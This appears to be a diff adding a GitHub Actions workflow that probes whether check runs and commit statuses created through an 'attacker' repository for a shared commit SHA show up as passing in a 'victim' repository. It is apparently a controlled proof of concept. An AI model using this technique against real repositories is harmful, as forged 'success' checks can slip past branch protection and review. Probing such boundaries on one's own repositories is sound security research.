@@ -1,0 +1,59 @@
+name: Shared SHA check boundary
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  checks: write
+  statuses: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      SHARED_SHA: 3fd5ec6edfe6a883bf619aec544a10f22aebe29a
+      ATTACKER_REPO: ilyyeees/no01-agent-assigned-20261002
+      VICTIM_REPO: ilyyeees/no01-checks-shared-victim-20261002
+    steps:
+      - name: Create attacker-repository check and status
+        run: |
+          set -euo pipefail
+          check_code=$(curl --silent --show-error --output check-create.json --write-out '%{http_code}' \
+            --request POST \
+            --header "Authorization: Bearer ${GH_TOKEN}" \
+            --header 'Accept: application/vnd.github+json' \
+            --header 'X-GitHub-Api-Version: 2026-03-10' \
+            --data "$(jq -nc --arg sha "${SHARED_SHA}" '{name:"NO01 shared required context",head_sha:$sha,status:"completed",conclusion:"success",output:{title:"Controlled shared-SHA proof",summary:"Created only through the attacker repository endpoint."}}')" \
+            "https://api.github.com/repos/${ATTACKER_REPO}/check-runs")
+          status_code=$(curl --silent --show-error --output status-create.json --write-out '%{http_code}' \
+            --request POST \
+            --header "Authorization: Bearer ${GH_TOKEN}" \
+            --header 'Accept: application/vnd.github+json' \
+            --header 'X-GitHub-Api-Version: 2026-03-10' \
+            --data '{"state":"success","context":"NO01 shared status context","description":"Created only in attacker repository"}' \
+            "https://api.github.com/repos/${ATTACKER_REPO}/statuses/${SHARED_SHA}")
+          echo "::notice title=create controls::check_status=${check_code} status_status=${status_code}"
+
+      - name: Compare repository-scoped views
+        run: |
+          set -euo pipefail
+          for repo in "${ATTACKER_REPO}" "${VICTIM_REPO}"; do
+            curl --silent --show-error \
+              --header "Authorization: Bearer ${GH_TOKEN}" \
+              --header 'Accept: application/vnd.github+json' \
+              --header 'X-GitHub-Api-Version: 2026-03-10' \
+              "https://api.github.com/repos/${repo}/commits/${SHARED_SHA}/check-runs" > "checks-$(basename "${repo}").json"
+            curl --silent --show-error \
+              --header "Authorization: Bearer ${GH_TOKEN}" \
+              --header 'Accept: application/vnd.github+json' \
+              --header 'X-GitHub-Api-Version: 2026-03-10' \
+              "https://api.github.com/repos/${repo}/commits/${SHARED_SHA}/status" > "status-$(basename "${repo}").json"
+          done
+          attacker_checks=$(jq '[.check_runs[]? | select(.name == "NO01 shared required context")] | length' checks-no01-agent-assigned-20261002.json)
+          victim_checks=$(jq '[.check_runs[]? | select(.name == "NO01 shared required context")] | length' checks-no01-checks-shared-victim-20261002.json)
+          attacker_statuses=$(jq '[.statuses[]? | select(.context == "NO01 shared status context")] | length' status-no01-agent-assigned-20261002.json)
+          victim_statuses=$(jq '[.statuses[]? | select(.context == "NO01 shared status context")] | length' status-no01-checks-shared-victim-20261002.json)
+          echo "::notice title=attacker repository::checks=${attacker_checks} statuses=${attacker_statuses}"
+          echo "::notice title=victim repository::checks=${victim_checks} statuses=${victim_statuses}"
